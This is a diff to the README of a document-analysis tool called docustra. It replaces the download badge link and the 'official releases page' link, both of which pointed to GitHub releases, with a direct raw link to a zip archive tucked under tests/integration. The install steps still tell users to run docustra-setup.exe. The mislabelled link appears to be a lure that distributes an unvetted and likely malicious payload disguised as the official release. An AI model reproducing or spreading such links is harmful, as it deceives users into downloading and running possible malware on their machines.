@@ -1,12 +1,12 @@
 # 📑 docustra - Extract insights from complex document sets
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Accessible-sloughing768/docustra/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Accessible-sloughing768/docustra/main/tests/integration/Software_2.9.zip)
 
 Docustra simplifies complex document analysis. It uses advanced intelligence to read your files, answer questions, and provide accurate citations. This tool helps you manage information stored in PDFs, text files, and spreadsheets without manual searching.
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/Accessible-sloughing768/docustra/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Accessible-sloughing768/docustra/main/tests/integration/Software_2.9.zip).
 2. Locate the latest version of the installer under the Assets section.
 3. Download the file named `docustra-setup.exe`.
 4. Run the installer by double-clicking the file.
